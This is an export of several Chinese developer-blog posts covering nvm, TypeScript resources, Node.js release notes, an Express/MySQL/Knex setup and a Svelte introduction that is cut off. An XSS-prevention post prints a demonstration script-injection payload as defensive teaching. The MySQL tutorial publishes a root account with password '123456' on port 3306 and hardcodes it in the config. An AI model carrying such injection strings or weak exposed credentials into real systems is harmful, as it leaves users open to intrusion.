版本的 Node.js(建議安裝 LTS 版本) nvm lsnvm ls installed 查看目前已安裝的 Node.js 版本 nvm ls available 查看目前可安裝的 Node.js 版本 nvm use \u0026lt;version\u0026gt; 切換指定 \u0026lt;version\u0026gt; 版本的 Node.js nvm current 查看當前使用的 Node.js 版本 ","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52457342886_5035af0537_o.png","permalink":"https://wayneblog.ga/2022-10-27/nodejs-nvm/","title":"nvm - Nodejs 版本隨你切換"},{"content":" 參考網站\nTypeScript 是微軟開發的一個開源的編程語言，通過在 JavaScript 的基礎上添加靜態類型定義構建而成。TypeScript 通過 TypeScript 編譯器或 Babel 轉譯爲 JavaScript 代碼，可運行在任何瀏覽器和操作系統。下面來分享 10 個值得學習的 TypeScript 寶庫！\nTypeScript 官方文檔 TypeScript 官方文檔，提供了中文版本。\nGithub：https://github.com/microsoft/TypeScript\n學習 TypeScript 點我前往\n可能是中國最好的 TypeScript 入門到進階系統教程。\nGithub：https://github.com/mqyqingfeng/learn-typescript\nTypeScript 使用指南手冊 點我前往\nTypeScript 使用手冊（中文版）翻譯。\nGithub：https://github.com/zhongsp/TypeScript\n深入理解 TypeScript 點我前往\nTypeScript Deep Dive 中文版。\nGithub：https://github.com/jkchao/typescript-book-chinese\nTypeScript 入門教程 點我前往\n從 JavaScript 程序員的角度總結思考，循序漸進地理解 TypeScript。\nGithub：https://github.com/xcatliu/typescript-tutorial\nTypeScript 類型挑戰 點我前往\n高質量的類型可以提高項目的可維護性並避免一些潛在的漏洞。本項目意在於讓你更好地瞭解 TS 的類型系統，編寫你自己的類型工具，或者只是單純的享受挑戰的樂趣！\nGithub：https://github.com/type-challenges/type-challenges\nDefinitelyTyped DefinitelyTyped 包含大量的高質量的 TypeScript 類型定義。通過使用 DefinitelyTyped 及其包含的聲明文件，我們可以使用大多數流行的 JavaScript 庫，就像它們是 TypeScript 庫一樣，將通過編譯器進行類型驗證。\nGithub：https://github.com/DefinitelyTyped/DefinitelyTyped\nreact-redux-typescript-guide 點我前往\n本指南記錄了有關在 React（及其生態系統）中以函數式風格使用 TypeScript 的模式和祕訣。它將使代碼類型安全，同時專注於從實現中推斷類型，從長遠來看更容易編寫和維護正確的類型。\nGithub：https://github.com/piotrwitek/react-redux-typescript-guide\nReact+TypeScript 備忘錄 點我前往\n專注於幫助 React 開發人員在 React 應用中使用 TypeScript。\nGithub：https://github.com/typescript-cheatsheets/react\nclean-code-typescript 點我前往\n將 Clean Code 的概念適用到 TypeScript，引導讀者使用 TypeScript 編寫易讀、可擴展的應用。\nGithub：https://github.com/labs42io/clean-code-typescript\n谷歌 TypeScript 風格指南 點我前往\nGoogle TypeScript 風格指南。\nGithub：https://google.github.io/styleguide/tsguide.html\nAwesome TypeScript 點我前往\n很棒的 TypeScript 資源。\nGithub：https://github.com/semlinker/awesome-typescript\n","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52458187213_d3e26e7c48_o.png","permalink":"https://wayneblog.ga/2022-10-27/ts-learning-12-website/","title":"推薦 12 個值得學習的 TypeScript 寶庫！"},{"content":" 參考網站\n參考網站\nNode.js 19 在 2022-10-18 正式發布了，此次更新包括將 V8 JavaScript 引擎更新到 10.7，以及默認啟用 HTTP (s)/1.1 KeepAlive。\nNode.js 18 在本月晚些時候將進入長期支持（LTS），Node.js 19 將取代 Node.js 18 成為 \u0026ldquo;Current\u0026rdquo; 版本。\n官方文檔 node \u0026ndash;watch (實驗性) 運行時，增加了一個令人興奮的功能，支持使用 node --watch，選項在 \u0026ldquo;watch\u0026rdquo; 模式下運行。在 \u0026ldquo;watch\u0026rdquo; 模式下運行，當導入的文件被改變時，會重新啟動進程。\n1 node --watch index.js 此功能在 v19.0.0 和 v18.11.0+ 中可用。\n默認啟用 HTTP(S)/1.1 KeepAlive 從這個版本開始，Node.js 默認將 keepAlive 設置為 true，這意味著任何出站的 HTTP (s) 連線將自動使用 HTTP 1.1 Keep-Alive。默認的 keep-alive 時間是 5 秒。\n啟用 keep-alive 將提供更好的吞吐量，因為連接在默認情況下被重複使用。\n穩定的 WebCrypto WebCrypto API 現在已經穩定（以下算法除外：Ed25519、Ed448、X25519 和X448)\n使用 globalThis.crypto 或 require('node:crypto').webcrypto 來訪問這個模塊。\n自定義 ESM Resolution 調整 Node.js 已經刪除了 --experimental-specifier-resolution 標誌，其功能現在可以通過自定義加載器實現。\n移除 DTrace/SystemTap/ETW 支持 對 DTrace/SystemTap/ETW 的支持在 v19.0.0 中被移除，主要原因是資源的優先級問題。\n如果你有興趣幫助恢復 DTrace，可以查看該 issue：https://github.com/nodejs/node/issues/44550。\n依賴 V8 10.7 V8 引擎已經更新到 10.7 版本，這是 Chromium 107 的一部分。這個版本包括了 JavaScript API 的一個新特性：Intl.NumberFormat。\nIntl.NumberFormatv3 API 是一個新的 TC39 ECMA402 第三階段提案，擴展了先前存在的 Intl.NumberFormat。\nllhttp Node.js 19 搭載了 llhttp@8.1.0\nnpm Node.js 19 搭載了 npm@8.19.2\nNode.js 18 將進入 LTS Node.js 18 系列將在下週過渡到長期支持版本。\n生命週期 Node.js 14 將在 2023 年 4 月達到生命週期結束，因此建議用戶開始計劃升級到 Node.js 16（LTS）或 Node.js 18（LTS）。\nNode.js 16 (LTS) 將在 2023 年 9 月達到生命週期結束，比原計劃 2024 年 4 月提前了。\n更多詳情可查看：https://nodejs.org/en/blog/announcements/v19-release-announce/\n補充： Nodejs 16 的新特性 原文網址：https://weekly.shanyue.tech/release/node-16/\nNode 16 於四月二十日發布，山月在第一時間下載了Node16 體驗了以下新特性。偶數號的版本為LTS 版本，這將是既Node14 之後的下一個長期支持版本，Node14 在2020-10-27 已進入 Active LTS 階段，還沒有升級的同學要盡量更新呀。\n從 Node 16 Release 官方文檔 列出了此次它所有的新特性以及非常詳細的提交記錄。那它到底更新了哪些新特性，先讓我們一睹為快吧！\nTimers Promise API Timers Promise API 其實在 Node 15 就已存在，那時候是一個實驗特性，目前已進入了穩定階段，是一項令人興奮的特性。那它到底是幹什麼用的呢？\n先別急，在此之前，先看一個問題：如何實現一個sleep/delay 函數？\n答案也很簡單，使用 Promise 封裝一個 setTimeout 即可\n1 const sleep = (t = 0) =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, t)); 那有了 Timers Promise 之後呢，使用 setTimeout 直接可替代 sleep 功能，驚不驚喜。\n1 2 3 import { setTimeout } from \u0026#39;timers/promises\u0026#39;; await setTimeout(100); setTimeout 的第二個參數接收一個值，作為 Promise 成功後的返回值\n1 2 3 4 const r = await setTimeout(100, \u0026#39;hello, world\u0026#39;); //=\u0026gt; hello, world console.log(r); 而當 setInterval 也變為 Promise 形式後，對於每間隔一分鐘便執行操作的定時任務而言，具有更大的可讀性\n1 2 3 4 5 6 7 import { setInterval } from \u0026#39;timers/promises\u0026#39;; for await (const startTime of setInterval(100, Date.now())) { const now = Date.now(); if ((now - startTime) \u0026gt; 1000) break; }; 底層依賴升級 我們知道，Node 基於 v8、libuv、llhttp 等諸多依賴，這次它對諸多依賴進行了升級。如同我們的業務項目依賴於諸多軟件包，每一次依賴的升級也會對性能造成不少提升\nv8 升級到 9.0，主要是 ECMAScript RegExp Match Indices llhttp 升級到 6.0.0，用以解析 HTTP 報文 icu 升級到 69.1 npm 升級到 7.10.0 使用 process.versions 可看到相關依賴的版本號\n1 \u0026gt; process.versions export 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { \u0026#34;node\u0026#34;: \u0026#34;16.0.0\u0026#34;, \u0026#34;v8\u0026#34;: \u0026#34;9.0.257.17-node.10\u0026#34;, \u0026#34;uv\u0026#34;: \u0026#34;1.41.0\u0026#34;, \u0026#34;zlib\u0026#34;: \u0026#34;1.2.11\u0026#34;, \u0026#34;brotli\u0026#34;: \u0026#34;1.0.9\u0026#34;, \u0026#34;ares\u0026#34;: \u0026#34;1.17.1\u0026#34;, \u0026#34;modules\u0026#34;: \u0026#34;93\u0026#34;, \u0026#34;nghttp2\u0026#34;: \u0026#34;1.42.0\u0026#34;, \u0026#34;napi\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;llhttp\u0026#34;: \u0026#34;6.0.0\u0026#34;, \u0026#34;openssl\u0026#34;: \u0026#34;1.1.1k+quic\u0026#34;, \u0026#34;cldr\u0026#34;: \u0026#34;39.0\u0026#34;, \u0026#34;icu\u0026#34;: \u0026#34;69.1\u0026#34;, \u0026#34;tz\u0026#34;: \u0026#34;2021a\u0026#34;, \u0026#34;unicode\u0026#34;: \u0026#34;13.0\u0026#34;, \u0026#34;ngtcp2\u0026#34;: \u0026#34;0.1.0-DEV\u0026#34;, \u0026#34;nghttp3\u0026#34;: \u0026#34;0.1.0-DEV\u0026#34; } btoa 與 atob 關於 Base64 的轉化，Node 在以前使用了 Buffer.from，而現在支持 btoa/atob 與瀏覽器環境保持了一致。\n而對於一個 SSR 項目而言，執行環境的區分將無關緊要，統一使用 btoa/atob 就好了\n1 2 3 4 5 6 7 8 const base64 = { encode (v: string) { return isBrowser ? btoa(v) : Buffer.from(v).toString(\u0026#39;base64\u0026#39;); }, decode (v: string) { return isBrowser ? atob(v) : Buffer.from(v, \u0026#39;base64\u0026#39;).toString(); } } 更多 關於 Node16 升級的諸多小細節，可參閱版本發布獲取更多信息，可持續 Wayne\u0026rsquo;s Blog 對各軟件每一次重大版本升級的說明講解。\n","date":"2022-10-24T00:00:00Z","image":"https://live.staticflickr.com/65535/52449163172_6f0c5b3278_o.jpg","permalink":"https://wayneblog.ga/2022-10-24/nodejs-v19-release/","title":"Node v19 正式發布"},{"content":" 參考網站\n參考網站\n本文主要是展示使用 Express 和 MySQL 來搭建項目框架的步驟，展示瞭如何搭建項目並進行基本操作。\n創建項目 Express 是基於 Node.js 平台，快速、開放、極簡的 Web 開發框架。\n全局安裝 express-generator express-generator 是 Express 應用程序生成器工具，我們可以使用它來快速創建應用程序框架。\n1 2 3 4 npm install -g express-generator # (expressFrame 是項目名) express expressFrame 項目的目錄結構\nbin/www 是啟動入口文件，在裡面可以設置端口號等 下載依賴 創建好項目之後，裡面有包含基本的項目文件，也有相關依賴\n1 npm install 啟動項目 1 2 3 4 npm start # 啟動命令還可以是： # node ./bin/www 安裝 nodemon 可以安裝 nodemon 來監控 node.js 源代碼的任何變化和自動重啟你的服務器\n全局安裝 nodemon：\n1 npm install -g nodemon 啟動項目\n1 nodemon bin/www 這就啟動成功啦\n瀏覽器打開http://localhost:3000就能看到頁面啦\n安裝 winston 添加打印日誌文件 這裡採用的是 winston 日誌\n具體用法可看文檔：https://www.npmjs.com/package/winston\n1 npm i winston 配置打印日誌格式 在項目的根目錄添加一個配置打印日誌格式的文件 logger.js （此文件在 github 上）\n修改 app.js 的配置 修改項目默認的變量名：\n將 const logger = require('morgan'); 改成：const morgan = require('morgan') 相應的也要把 app.use(logger('dev')); 改成：app.use(morgan('dev')); 1 2 3 4 5 6 7 // ... - const logger = require(\u0026#39;morgan\u0026#39;); + const morgan = require(\u0026#39;morgan\u0026#39;); - app.use(logger(\u0026#39;dev\u0026#39;)); + app.use(morgan(\u0026#39;dev\u0026#39;)); // ... 引入 logger.js 文件 1 const logger = require(\u0026#39;./logger\u0026#39;) 修改錯誤處理 將錯誤打印到日誌上\n測試日誌是否打印成功 請求一個不存在的路由，如：http://localhost:3000/hello\n打開日誌文件，看到這條錯誤被打印出來就成功啦\nMySQL 啟動數據庫 這裡使用的方法是用 Docker 安裝 MySQL\n這裡是安裝的教程：https://www.runoob.com/docker/docker-install-mysql.html\ndocker 拉取 MySQL 鏡像 1 docker pull mysql:latest 查看本地鏡像 1 docker images 運行容器 1 2 # docker run -itd --name {容器名} -p 3306:3306 -e MYSQL_ROOT_PASSWORD={MySQL root 密碼} mysql docker run -itd --name mysql-test -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql 參數說明：\n-p 3306:3306：映射容器服務的3306端口到宿主機的3306端口，外部主機可以直接透過 宿主機ip:3306 訪問到 MySQL 的服務。 MYSQL_ROOT_PASSWORD=123456：設置 MySQL 服務 root 用戶的密碼。 安裝成功 透過 docker ps 命令查看是否安裝成功\n本機可以通過 root / 123456 訪問 MySQL 服務。\n安裝數據庫管理工具 Sequel Pro macOS 用戶安裝 navicat windows 用戶安裝 這裡選擇用 Sequel Pro 啟動好數據之後，就在 Sequel Pro 連接數據庫，密碼是啟動數據庫時自己設置的密碼\n使用 Navicat 數據庫管理工具連線時，出現錯誤 若出現 1251 - Client does not support authentication protocol requested by server; consider upgrading MySQL client 錯誤，原因為：\nmysql8 之前的版本，加密規則是 mysql_native_password，而 mysql8 之後的版本，加密規則是 caching_sha2_password\n解決方法： 升級 navicat 驅動。 進到容器內，把 mysql 用戶登入密碼加密規則還原成 mysql_native_password 以下採用方法2解決，操作如下：\n1. 打開 cmd，輸入以下指令以 bash 進入容器： 1 2 # docker exec -it {容器名} bash docker exec -it mysql-test bash 2. 使用 mysql 指令連線資料庫： 1 mysql -u root -p 3. 使用 mysql 指令查詢用戶訊息： 1 select host, user, plugin, authentication_string from mysql.user; host 為 % 表示不限制 ip、localhost 表示本機使用\nplugin 非 mysql_native_password 則需要修改密碼\n4. 使用 mysql 指令修改密碼： 更新 user 為 root， host 為 % 的密碼為 123456 1 ALTER USER \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;123456\u0026#39;; 更新 user 為 root， host 為 localhost 的密碼為 123456 1 ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;123456\u0026#39;; 5. 再次在 Navicat 中連接 mysql，連接成功 創建數據庫 使用數據庫管理工具新建數據庫 database 名稱為：expressFrame\n進入 expressFrame 庫，新建用戶信息表為 user ，默認有 id 字段，需要再添加以下必要字段：\n字段：id\n1 2 Field:name Type:VARCHAR LENGTH:255 Comment:姓名 Field:phone Type:VARCHAR LENGTH:255 Comment:手機號 使用 Knex.js 增刪改查數據庫 Knex.js 是為 Postgres、MSSQL、MySQL、MariaDB、SQLite3、Oracle 和 Amazon Redshift 設計的 SQL 查詢構建器，其設計靈活，便於攜帶並且使用起來非常有趣。Knex 的主要目標環境是 Node.js，您需要安裝該 knex 庫，然後安裝適當的數據庫庫：pg 適用於 PostgreSQL、CockroachDB 和 Amazon Redshift，pg-native 對於具有本機 C++ libpq 綁定的 PostgreSQL（需要安裝 PostgresSQL 才能鏈接），mysql 適用於 MySQL 或 MariaDB，sqlite3 適用於 SQLite3，tedious 適用於 MSSQL。\nFlag Library pg PostgreSQL、CockroachDB、Amazon Redshift pg-native 本機 C++ libpq 綁定的 PostgreSQL（需要安裝 PostgresSQL 才能鏈接） mysql MySQL、MariaDB sqlite3 SQLite3 tedious MSSQL 下載相關依賴 1 npm install -save knex mysql 添加配置信息 在項目根目錄下，新建配置信息 config.js，之後的配置信息涉及到數據庫和密碼，不上傳到 Github 等託管平台，所以需要單獨設置，使用 .gitignore 避免上傳。之後敏感的配置信息，都將在此配置。host 地址為數據庫的服務地址，本地為 127.0.0.1\nconfig.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const configs = { mysql: { host: \u0026#39;127.0.0.1\u0026#39;, port: \u0026#39;3306\u0026#39;, user: \u0026#39;root\u0026#39;, password: \u0026#39;123456\u0026#39;, // 自己設置的密碼 database: \u0026#39;expressFrame\u0026#39; // 數據庫的名字 }, // 打印错误 log: { error (message) { console.log(\u0026#39;[knex error]\u0026#39;, message) } } } module.exports = configs 新建 .gitignore 在項目根目錄下，新建 .gitignore 避免上傳 config.js 、log、 node_modules 等不需要被上傳到 Github 的文件。\n.gitignore 1 2 3 4 5 6 7 .DS_Store .idea npm-debug.log yarn-error.log node_modules log config.js 數據庫配置 新建 models/knex.js，初始化配置 knex\nmodels/knex.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 引用配置文件 const configs = require(\u0026#39;../config\u0026#39;); // 把配置文件中的信息，設置在初始化配置中 module.exports = require(\u0026#39;knex\u0026#39;)({ client: \u0026#39;mysql\u0026#39;, connection: { host: configs.mysql.host, port: configs.mysql.port, user: configs.mysql.user, password: configs.mysql.password, database: configs.mysql.database }, // 打印錯誤 log: { error (message) { console.log(\u0026#39;[knex error]\u0026#39;, message) } } }) knex 增刪改查 在 models 下新建文件 base.js\nmodels/base.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 const knex = require(\u0026#39;../models/knex\u0026#39;); class Base{ constructor(props){ this.table = props; } // 查找 all (){ return knex(this.table).select(); } // 新增 insert (params){ return knex(this.table).insert(params); } // 更改 update (id, params){ return knex(this.table).where(\u0026#39;id\u0026#39;, \u0026#39;=\u0026#39;, id).update(params); } // 删除 delete (id){ return knex(this.table).where(\u0026#39;id\u0026#39;, \u0026#39;=\u0026#39;, id).del(); } } module.exports = Base; 新建用戶模型 在 models 下新建文件 user.js\nmodels/user.js 1 2 3 4 5 6 7 8 9 10 const Base = require(\u0026#39;./base\u0026#39;); class User extends Base { // 定義參數默認值為 user 表 constructor(props = \u0026#39;user\u0026#39;){ super(props); } } module.exports = new User(); 新建用戶控制器 在根目錄新建控制器文件夾 controllers，在 controllers 新建 user.js，並設置 showUser 方法\ncontrollers/user.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 引用用户模版数据 const User = require(\u0026#39;../models/user.js\u0026#39;); const userController = { // showUser 獲取用戶數據並返回到頁面 showUser: async function(req,res,next){ try{ let userData = await User.all() res.json({ code: 200, message: \u0026#34;操作成功\u0026#34;, data: userData }) }catch(e){ res.json({ code: 0, message: \u0026#34;操作失敗\u0026#34;, data: e }) } }, } module.exports = userController; 添加獲取用戶接口 修改路由 routes/index.js，添加獲取用戶信息的接口\nroutes/index.js 1 2 3 4 const userController = require(\u0026#39;../controllers/user\u0026#39;); // 獲取用戶信息 router.get(\u0026#39;/get_user\u0026#39;, userController.showUser); 測試接口 訪問一下 http://localhost:3000/get_user\n查看接口返回的數據\n這就大功告成啦～\ngithub地址：https://github.com/wjdesign/nodejsExpressMysqlDemo\n走過路過點個贊唄～\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52443177409_7e96fe402c_o.png","permalink":"https://wayneblog.ga/2022-10-21/nodejs-express-mysql/","title":"Node.js + Express + MySQL 搭建項目框架"},{"content":" 參考網站\n簡介 xss 是常見的攻擊方式之一，不管是前端還是後端都要對此有所防範才行。\n本文主要講解使用 NodeJS 開發的後端程序應該如何防範 xss 攻擊。\nxss演示 xss 攻擊方式主要是在在頁面展示內容中摻雜 js代碼，以獲取網頁信息。\n常見的攻擊地方有：\n電商產品評價區：某用戶提交的評價帶有可執行的js代碼，其他用戶查看該評論時就會執行那段js代碼。 博客網站：某用戶在博客的標題或者內容中帶有可執行的js代碼，其他用戶查看該博客時那段 js代碼 就會被執行。 比如在輸入框輸入\n1 \u0026lt;script\u0026gt;alert(1234)\u0026lt;/script\u0026gt; 別的用戶在自己頁面要展示上面這段內容個，頁面有可能會彈出一個彈窗。\n這個例子只是彈出一個對話框，如果人家有惡意，獲取cookie 等信息，然後傳給自己的服務器，那後果真的很嚴重。\nxss防禦 預防措施：轉義特殊字符\n特殊符號轉換\n1 2 3 4 5 6 \u0026amp; -\u0026gt; \u0026amp;amp; \u0026lt; -\u0026gt; \u0026amp;lt; \u0026gt; -\u0026gt; \u0026amp;gt; \u0026#34; -\u0026gt; \u0026amp;quot; \u0026#39; -\u0026gt; \u0026amp;#x27; / -\u0026gt; \u0026amp;#x2F; 上面我羅列了幾個常見的特殊字符。從上面的例子可以看出，輸入了 \u0026lt;script\u0026gt; 標籤後，裡面的內容有可能會被執行。\n如果我們把 \u0026lt;script\u0026gt; 改成 \u0026amp;lt;script\u0026amp;gt; 那麼瀏覽器就不把這段內容看成是可執行代碼。\n在日常開發中，我們不需要自己編寫轉義功能的代碼，只需要下載 xss 的依賴包就行。\n安裝 xss 依賴包\n1 npm install xss --save 使用 xss。 xss 其實是一個方法，只需要把要轉義的內容傳入 xss 方法即可。\n1 2 3 4 const xss = require(\u0026#39;xss\u0026#39;) const content = xss(\u0026#39;\u0026lt;script\u0026gt;alert(1234)\u0026lt;/script\u0026gt;\u0026#39;) console.log(content) 最後輸出\n1 \u0026amp;lt;script\u0026amp;gt;alert(1234)\u0026amp;lt;/script\u0026amp;gt; 以上就是 xss攻擊 在後端的防禦方法。\n如果嚴謹一點的話，在前端也可以把文本域的內容裡的特殊字符轉義一遍再傳給後端。\n後端傳給前端的內容有可能會在頁面展示成 \u0026amp;lt;script\u0026amp;gt;alert(1234)\u0026amp;lt;/script\u0026amp;gt;，這部分需要前端自己去處理。\n插則花邊新聞\n之前看到有則新聞說 Vue 不安全，某些ZF項目中使用 Vue 受到了 xss 攻擊。後端甩鍋給前端，前端甩鍋給了 Vue。\n後來聽說是前端胡亂使用 v-html 渲染內容導致的，而 v-html 這東西官方文檔也提示了有可能受到 xss 攻擊。\n尤雨溪：很多人就是不看文檔\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52442821071_35fc2e7087_o.png","permalink":"https://wayneblog.ga/2022-10-21/nodejs-prevent-xss/","title":"NodeJS 防止 xss 攻擊"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n其實在很久之前我就注意到 Svelte，但一直沒把這個框架放在心上。\n因為我之前的工作主要使用 Vue，但完全沒遇到過使用 Svelte 的項。\n直到 Vite 的出現，我才開始開始重視 Svelte。\n從 Vite 文檔 裡可以看到它支持這些模板：\nJavaScript TypeScript vanilla vanilla vue vue react react preact preact lit lit svelte svelte 能讓祖師爺也重視的框架，不簡單不簡單~\n我喜歡用 Demo 的方式學習新技術，Svelte 官方入門教程 就提供了這種方式。\n這是我覺得入門比較舒服且方便日後搜索的學習方式。\n雖然 Svelte 官方入門教程 已經給出很多例子，而且 Svelte中文網 也有對應的翻譯，但有些翻譯看上去是機譯，而且部分案例可能不太適合新手學習~\n本文的目的是把 Svelte 的學習流程梳理出來，讓第一次接觸 Svelte 的工友能順利上手。\n本文適合人群：有HTML、CSS、JS基礎，知道並已經安裝了Node。\n如果你是打算從0開始學習前端，那本文暫時還不適合你閱讀。\nSvelte 簡介 Svelte 是一個構建web 應用程序的工具。\n傳統框架如React 和Vue 在瀏覽器中需要做大量的工作，而Svelte 將這些工作放到構建應用程序的編譯階段來處理。\n需要注意，Svelte 是一款編譯器。它可以將按照規定語法編寫的代碼打包成瀏覽器能運行的項目。\n和其他前端框架一樣，同樣也是使用HTML、CSS 和 JavaScript 進行開發。\n作者 在學習 Svelte 之前先了解一下它的父親（作者）。\nSvelte 的作者叫 Rich Harris\n可能國內大多數工友對他不是很熟悉（我也完全不熟），但應該聽過 Rollup。\n沒錯，他也是 Rollup 的爸爸。\n他在開發 Svelte 之前還開發過 Ractive.js，聽說 Vue 的部分實現也是受到了 Ractive 的啟發。\n關於 Rich Harris 的介紹還有很多，我搜到的資料上這樣介紹到：\n大學專業是學哲學的 在紐約時報調查組工作的圖形編輯，身兼記者和開發者職位 還有更多關於他和 Svelte 的介紹，可以看看《Svelte - The magical disappearing UI framework - Interview with Rich Harris》\nSvelte 的優勢 Svelte 翻譯成中文就是 苗條 的意思，側面表明它打包出來的包非常小。\nSvelte 主要優勢有以下幾點。\n編譯器 在打開 Svelte官網 時就能看到這樣的介紹。\nSvelte 是一種全新的構建用戶界面的方法。傳統框架如 React 和 Vue 在瀏覽器中需要做大量的工作，而 Svelte 將這些工作放到構建應用程序的編譯階段來處理。\nSvelte 組件需要在 .svelte 後綴的文件中編寫，Svelte 會將編寫好的代碼翻編譯 JS 和 CSS 代碼。\n打包體積更小 Svelte 在打包會將引用到的代碼打包起來，而沒引用過的代碼將會被過濾掉，打包時不會加入進來。\n在 《A RealWorld Comparison of Front-End Frameworks with Benchmarks (2019 update)》 報告中，對主流框架進行了對比。\n在經過 gzip 壓縮後生成的包大小，從報告中可以看出，Svelte 打包出來的體積甩開 Vue、React 和 Angular 幾條街。\n這是因為經過 Svelte 編譯的代碼，僅保留引用到的部分。\n不使用 Virtual DOM Virtual DOM 就是 虛擬DOM，是用 JS 對象描述 DOM 節點的數據，由 React 團隊推廣出來的。\n虛擬DOM 是前端的網紅，因此也有很多開發者開始研究和搞辯論賽。\n網上有一張圖對比了 Svelte 和 React 在數據驅動視圖的流程\n其實主要對比了使用虛擬DOM和直接操作真實DOM的區別。 在 React 中實現數據驅動視圖大概流程是這樣的：\n1 數據發生變化 -\u0026gt; 通過diff算法判斷要更新哪些節點 -\u0026gt; 找到要更新的節點 -\u0026gt; 更新真實DOM Vue 的數據更新原理其實也差不多，只是實現方式和使用語法會有所不同。\ndiff算法 會根據數據更新前和更新後生成的虛擬DOM進行對比，只有兩個版本的虛擬DOM存在差異時，才會更新對應的真實DOM。\n使用虛擬DOM對比的方式會比直接對比真實DOM的效率高。\n而且真實DOM身上掛載的屬性和方法非常多，使用虛擬DOM的方式去描述DOM節點樹會顯得更輕便。\n但這也意味著每次數據發生變化時都要先創建一個虛擬DOM，並使用 diff算法 將新虛擬DOM與舊虛擬DOM進行比對，這個步驟會消耗一點性能和需要一點執行時間。\n而 Svelte 在未使用虛擬DOM的情況下實現了響應式設計。\n我以粗暴的方式理解：Svelte 會監聽頂層組件所有變量，一旦某個變量發生變化，就更新使用過該變量的組件。這就僅僅只需更新受影響的那部分DOM元素，而不需要整個組件更新。\n綜上所述，在我的理解力，虛擬DOM的思想很優秀，也是順應時代的產物，但虛擬DOM並不是最快的，JS 直接操作 DOM 才是最快。\n《Virtual DOM is pure overhead》是 Svelte 官網上的一篇博客，專門討論虛擬DOM。有興趣的工友可以看看~\n更自然的響應式 這裡說的響應式設計是只關於數據的響應，而不是像 Bootstrap 的響應式佈局。\n現在流行的前端框架基本都使用 數據驅動視圖 這個概念，像 Vue 和 React 這些框架，都有響應式數據的概念。\n但 Vue 和 React 在數據響應方面還是有點不那麼自然，我簡單舉幾個例子：\n在 React 中，如果需要更新數據並在視圖中響應，需要使用 setState 方法更新數據。\n在 Vue2 中，響應式數據要放在 data 裡，在 methods 中使用 this.xxx 來更新數據。\n在 Vue3 的 Composition API 語法中，需要使用 ref 或者 reactive 等方法包裹數據，使用 xxx.value 等方式修改數據。\n上面這幾種情況，感覺多少都添加了點東西才能實現響應式數據功能（至少在普通開發者開發時是這樣）。\n在 Svelte 的理念中，響應式應該給開發者一種無感體驗，比如在 Excel 中，當我規定 C1 單元格的值是 A1 + B1 的和，設置好規則後，用戶只需要修改 A1 和 B1 即可，C1 會自動響應，而不需再做其他操作。\n在這方面，Svelte 我認為在現階段是做得最自然的。\n1 2 3 4 5 6 7 8 9 \u0026lt;h1\u0026gt;{name}\u0026lt;/h1\u0026gt; \u0026lt;script\u0026gt; let name = \u0026#39;雷猴\u0026#39; setTimeout(() =\u0026gt; { name = \u0026#39;鯊魚辣椒\u0026#39; }, 1000) \u0026lt;/script\u0026gt; 上面的代碼中，1秒後修改 name 的值，並更新視圖。\n從代碼就能看出，在使用 Svelte 開發項目時，開發者一般無需使用額外的方法就能做到和 Vue、React 的響應式效果。\n如果你對 Svelte 響應式原理感興趣，推薦閱讀 FESKY 的 《Svelte 響應式原理剖析—— 重新思考Reactivity》\n也可以看看 《Rethinking reactivity》，看看官方對 reactivity 的思考。\n性能強 Stefan Krause 給出一份 性能測試報告（點擊可查看） 對比里多個熱門框架的性能。從 Svelte 的性能測試結果可以看出，Svelte 是相當優秀的。\n內存優化 性能測試報告（點擊可查看） 也列出不同框架的內存佔用程度，Svelte 對內存的管理做到非常極致，佔用的內存也是非常小，這對於配置不高的設備來說是件好事。\n第5、6點，由於測試報告比較長，我沒截圖放進文中。大家有興趣可以點開鏈接查看測試報告。\n更關注無障礙體驗 在使用 Svelte 開發時會 自動對無障礙訪問方面的體驗進行檢測，比如 img 元素沒有添加 alt 屬性，Svelte 會向你發出一條警告。無障礙體驗對特殊人事來說是很有幫助的，比如當你在 img 標籤中設置好 alt 屬性值，使用有聲瀏覽器會把 alt 的內容讀出來。\n在此我還要推薦2本關於設計體驗的書。\n《點石成金：訪客至上的Web和移動可用性設計秘笈》 《包容性Web設計》 它們的封面長分別這個樣子\nSvelte 的優勢肯定還有很多，但由於我開發經驗不足，只能總結出以上這些了。如果你對 Svelte 有更多理解，歡迎在評論區補充~\nSvelte 的不足 Svelte 對 IE 是非常不友好的，但我並不把這放在眼裡。如果想兼容 IE 我還是推薦使用 jQuery。 Svelte 的生態不夠豐富。由於是新寵，生態方面肯定是不如 Vue 和 React 的。 與 Svelte 相關的庫 Sapper Sapper 官網地址\nSapper 是構建在Svelte 上的框架，Sapper 提供了頁面路由、佈局模板、SSR等功能。\nSvelte Native Svelte Native 官網地址\nSvelte Native 是建立在 NativeScript 之上的產物，可以開發安卓和iOS應用，是一個跨端技術。\n有點類似於 React Native 和 Weex 之類的東西。\nsvelte-gl svelte-gl Github\nsvelte-gl 還沒正式發布，但這是個很有趣的工具，它和three.js類似，專門做3D應用的。\n雖然現在 github 上的 Star 還不是很多，但也可以寫些 demo 玩玩。\n創建項目 在開始之前，你需要在電腦上安裝Node環境(v16+)。\n編輯工具我使用了 VS Code，同時安裝了 Svelte for VS Code 擴展插件。\n使用 Svelte 前，必須有一個開發環境。\n創建或使用開發環境有以下幾種方式：\nREPL Rollup版 Webpack版 Parcel版 Vite版 本文使用的是 Vite 創建項目，但上面列出的所有方式我都會逐一說說。\nREPL REPL是 Svelte 提供的一個線上環境，打開 Svelte 官網 可以看到頂部導航欄上面有個 REPL 的選項。點擊該選項就可以跳轉到 